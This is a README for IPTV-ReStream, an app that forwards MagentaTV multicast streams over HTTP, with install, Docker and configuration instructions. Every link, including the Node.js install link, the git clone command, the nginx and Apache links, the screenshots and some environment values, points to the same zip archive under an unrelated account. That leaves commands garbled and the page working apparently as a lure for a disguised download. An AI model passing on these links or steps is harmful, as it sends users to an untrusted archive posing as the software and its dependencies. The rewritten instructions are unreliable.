# IPTV-ReStream #
This app allows remotely viewing source-specific multicast RTP streams (e.g. Deutsche Telekom MagentaTV), by forwarding it using HTTP.

![Status Page](https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip)
![Stations Page](https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip)

## Features
* lightweight: there is no de- or encoding happening, the stream is simply forwarded
* simple Dashboard with Statistics
* Station List with Images
* VLC-ready playlist included
* Open stream directly in VLC (iOS & Android only)
* automatic running program detection (from MPEG-TS stream)

## Installation
1. Install [https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip](https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip) (v13.1 or higher)
2. Clone this Repo: `git clone https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip` or click 'Download'
3. Install dependencies `npm install` and transpile `npm run build`
4. Download [this list](https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip) of stations (by [https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip](https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip)) and place it in the `data` directory
5. Export environment variables (see below), if necessary
6. Run `npm start`

Or with Docker (Linux only):
1. [Install](https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip) Docker
2. run `docker run -d --network host --restart always --name IPTV-ReStream [-e HOST="127.0.0.1" | -e PORT=3000 | -e MCAST_IF="0.0.0.0" | -e XSPF_PROTOCOL="https" | -e XSPF_HOST="https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip" | -e XSPF_PATH_PREFIX="/iptv" | -e ALLOW_UNKNOWN="false" | -e DEBUG="iptv-restream:*"] nthumann/iptv-restream:latest` (parameters in brackets are optional)

The image is also available on GitHub Container Registry (use `https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip`).
### Configuration ###
It's highly recommended running this application behind a Reverse Proxy ([nginx](https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip) or [Apache httpd](https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip)) that enforces authentication (and encryption). When using a reverse proxy it's probably mandatory to adjust environment variables `XSPF_PROTOCOL`, `XSPF_HOST` and `XSPF_PATH_PREFIX`, otherwise the application may generate an invalid VLC XSPF-Playlist. For example, if the application is reachable over a Reverse Proxy via https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip, then run `export XSPF_PROTOCOL=https https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip XSPF_PATH_PREFIX=/iptv`. Also, if the clients real IP and Port should be visible on the Dashboard, make sure to pass HTTP Headers `X-Real-IP` and `X-Real-Port` from the Reverse Proxy to the Application.

### Environment Variables
| Variable | Description |
| -------- | ----------- |
| HOST | Web interface Listen Host (default `127.0.0.1`) |
| PORT | Web interface Listen Port (default `3000`) |
| MCAST_IF | joins the multicast group using this interface (default `0.0.0.0`, lets OS choose automatically) |
| XSPF_PROTOCOL | Protocol (`http`/`https`) for generating XSPF |
| XSPF_HOST | Host and Port for generating XSPF |
| XSPF_PATH_PREFIX | Path Prefix for generating XSPF |
| ALLOW_UNKNOWN | Allow forwarding streams that are not in the station list (default `0`/`false`) |
| DEBUG | Enable Debug Logging (`iptv-restream:*`) |

### Usage
Open the web interface and navigate to `Stations`, then download the XSPF Playlist for VLC and open it. Done!
If you're running iOS or Android, you can also simply hit the play button in the web interface to open up VLC automatically.

It is also possible to access the source-specific multicast streams directly by opening `/live/mcast_source@mcast_group:mcast_port` (e.g. `/live/87.141.215.251@232.0.20.35:10000` for Das Erste HD) or by using the shortcut at `/live/station/station_title` (e.g. `/live/station/ZDFSD` for ZDF SD).
Please note that running on Windows only supports streaming one program. For streaming multiple programs concurrently use Linux.

## Under the hood ##
For example MagentaTV delivers the H.264 video stream via MPEG-TS, wrapped into RTP packets over source specific multicast. Therefore, it is not possible to access this stream when connected to a non-MagentaTV line. This app is proxying the video stream: It receives it, just as usual, at your Telekom line at home and re-streams it over HTTP to your other devices. This concept is inspired by [udpxy](https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip).